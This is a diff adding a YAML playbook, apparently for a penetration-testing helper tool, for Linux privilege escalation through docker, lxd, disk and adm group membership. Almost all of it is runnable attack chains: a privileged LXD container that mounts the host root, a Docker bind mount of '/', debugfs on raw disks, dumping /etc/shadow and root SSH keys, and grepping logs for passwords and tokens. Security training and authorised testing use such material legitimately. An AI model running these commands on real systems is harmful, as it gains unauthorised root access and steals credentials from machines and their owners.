@@ -1,0 +1,362 @@
+name: Linux PrivEsc Privileged Groups
+
+steps:
+
+# =========================================================
+# [1] ENUMERATE GROUPS
+# =========================================================
+- title: Enumerate Groups
+  mode: enum
+  info: |
+    Identify dangerous group memberships that may allow privilege escalation.
+
+  entries:
+
+    - cmd: "id"
+      info: current user groups
+
+    - cmd: "groups"
+      info: group membership
+
+    - cmd: "cat /etc/group"
+      info: enumerate all groups
+
+    - cmd: "getent group docker"
+      info: docker members
+
+    - cmd: "getent group lxd"
+      info: lxd members
+
+    - cmd: "getent group disk"
+      info: disk members
+
+    - cmd: "getent group adm"
+      info: adm members
+
+  look_for:
+    - docker
+    - lxd
+    - disk
+    - adm
+    - sudo
+    - root
+
+  notes:
+    - privileged groups may allow indirect root access
+    - always enumerate group memberships early
+
+
+# =========================================================
+# [2] LXD / LXC ENUMERATION
+# =========================================================
+- title: LXD Enumeration
+  mode: enum
+  info: |
+    LXD group membership may allow mounting the host filesystem as root.
+
+  entries:
+
+    - cmd: "id"
+      info: verify lxd group membership
+
+    - cmd: "which lxc"
+      info: lxc installed
+
+    - cmd: "lxc image list"
+      info: existing images
+
+    - cmd: "lxc list"
+      info: running containers
+
+  look_for:
+    - lxd group membership
+    - accessible lxc binary
+    - ability to create containers
+
+  notes:
+    - lxd membership is often equivalent to root
+    - common on Ubuntu systems
+
+
+# =========================================================
+# [3] LXD PRIVESC
+# =========================================================
+- title: LXD Privilege Escalation
+  mode: chain
+  info: |
+    Create a privileged container and mount the host filesystem.
+
+  entries:
+
+    - cmd: "unzip alpine.zip"
+      info: extract alpine image
+
+    - cmd: "lxd init"
+      info: initialize lxd
+
+    - cmd: "lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine"
+      info: import image
+
+    - cmd: "lxc init alpine r00t -c security.privileged=true"
+      info: create privileged container
+
+    - cmd: "lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true"
+      info: mount host filesystem
+
+    - cmd: "lxc start r00t"
+      info: start container
+
+    - cmd: "lxc exec r00t /bin/sh"
+      info: spawn root shell
+
+    - cmd: "cd /mnt/root/root"
+      info: access host root directory
+
+  look_for:
+    - mounted host filesystem
+    - root shell inside container
+    - host sensitive files
+
+  notes:
+    - root inside container maps to host root
+    - useful targets:
+      - /mnt/root/etc/shadow
+      - /mnt/root/root/.ssh
+      - /mnt/root/home
+    - alpine image usually required
+
+
+# =========================================================
+# [4] DOCKER ENUMERATION
+# =========================================================
+- title: Docker Enumeration
+  mode: enum
+  info: |
+    Docker group membership may allow filesystem access as root.
+
+  entries:
+
+    - cmd: "id"
+      info: verify docker group
+
+    - cmd: "docker ps"
+      info: running containers
+
+    - cmd: "docker images"
+      info: local images
+
+    - cmd: "docker info"
+      info: daemon access
+
+  look_for:
+    - docker group membership
+    - ability to run containers
+    - mounted host volumes
+
+  notes:
+    - docker group is effectively root
+    - mounting host directories enables full access
+
+
+# =========================================================
+# [5] DOCKER PRIVESC
+# =========================================================
+- title: Docker Privilege Escalation
+  mode: chain
+  info: |
+    Mount the host filesystem inside a docker container.
+
+  entries:
+
+    - cmd: "docker run -v /:/mnt -it ubuntu"
+      info: mount full host filesystem
+
+    - cmd: "cd /mnt/root"
+      info: access host root directory
+
+    - cmd: "cat /mnt/etc/shadow"
+      info: dump shadow file
+
+    - cmd: "ls /mnt/root/.ssh"
+      info: retrieve root ssh keys
+
+  look_for:
+    - host filesystem mounted
+    - root-owned files
+    - ssh keys
+    - shadow hashes
+
+  notes:
+    - mounting / gives full host filesystem access
+    - container usually runs as root by default
+
+
+# =========================================================
+# [6] DISK GROUP ENUMERATION
+# =========================================================
+- title: Disk Group Enumeration
+  mode: enum
+  info: |
+    Disk group members can directly access block devices.
+
+  entries:
+
+    - cmd: "id"
+      info: verify disk group
+
+    - cmd: "ls -l /dev/sd*"
+      info: enumerate block devices
+
+    - cmd: "fdisk -l"
+      info: identify partitions
+
+    - cmd: "which debugfs"
+      info: debugfs availability
+
+  look_for:
+    - disk group membership
+    - accessible block devices
+    - mounted partitions
+
+  notes:
+    - raw disk access may expose entire filesystem
+    - equivalent to offline root access
+
+
+# =========================================================
+# [7] DISK PRIVESC
+# =========================================================
+- title: Disk Privilege Escalation
+  mode: chain
+  info: |
+    Access the filesystem directly through block devices.
+
+  entries:
+
+    - cmd: "debugfs /dev/sda1"
+      info: open filesystem
+
+    - cmd: "cat /root/.ssh/id_rsa"
+      info: retrieve root ssh key
+
+    - cmd: "cat /etc/shadow"
+      info: dump password hashes
+
+  look_for:
+    - readable root files
+    - ssh keys
+    - password hashes
+
+  notes:
+    - partition name may differ:
+      - /dev/sda1
+      - /dev/vda1
+      - /dev/nvme0n1p1
+
+
+# =========================================================
+# [8] ADM GROUP ENUMERATION
+# =========================================================
+- title: ADM Group Enumeration
+  mode: enum
+  info: |
+    ADM group members can read system logs.
+
+  entries:
+
+    - cmd: "id"
+      info: verify adm group
+
+    - cmd: "ls -la /var/log"
+      info: enumerate logs
+
+    - cmd: "find /var/log -type f 2>/dev/null"
+      info: list log files
+
+  look_for:
+    - auth logs
+    - cron logs
+    - backup scripts
+    - passwords in logs
+    - command history
+
+  notes:
+    - adm does not directly give root
+    - but often leaks sensitive information
+
+
+# =========================================================
+# [9] ADM LOG LOOTING
+# =========================================================
+- title: ADM Log Looting
+  mode: enum
+  info: |
+    Extract credentials and sensitive information from logs.
+
+  entries:
+
+    - cmd: "cat /var/log/auth.log"
+      info: authentication logs
+
+    - cmd: "grep -Ri password /var/log 2>/dev/null"
+      info: search passwords
+
+    - cmd: "grep -Ri token /var/log 2>/dev/null"
+      info: search tokens
+
+    - cmd: "grep -Ri key /var/log 2>/dev/null"
+      info: search keys
+
+    - cmd: "cat /var/log/syslog"
+      info: cron / service logs
+
+  look_for:
+    - credentials
+    - api tokens
+    - backup scripts
+    - executed commands
+    - cron jobs
+
+  notes:
+    - developers often log secrets accidentally
+    - useful for credential reuse
+
+
+# =========================================================
+# [10] FULL GROUP WORKFLOW
+# =========================================================
+- title: Full Privileged Group Workflow
+  mode: chain
+  info: |
+    Example workflow for privileged group abuse.
+
+  entries:
+
+    - cmd: "id"
+      info: enumerate groups
+
+    - cmd: "groups"
+      info: identify dangerous memberships
+
+    - cmd: "docker run -v /:/mnt -it ubuntu"
+      info: docker privesc
+
+    - cmd: "lxc exec r00t /bin/sh"
+      info: lxd privesc
+
+    - cmd: "debugfs /dev/sda1"
+      info: disk privesc
+
+    - cmd: "grep -Ri password /var/log 2>/dev/null"
+      info: adm credential hunting
+
+  look_for:
+    - root filesystem access
+    - credentials
+    - ssh keys
+    - mounted host filesystems
+
+  notes:
+    - docker/lxd often lead directly to root
+    - adm usually leads to credential disclosure
+    - disk provides raw filesystem access
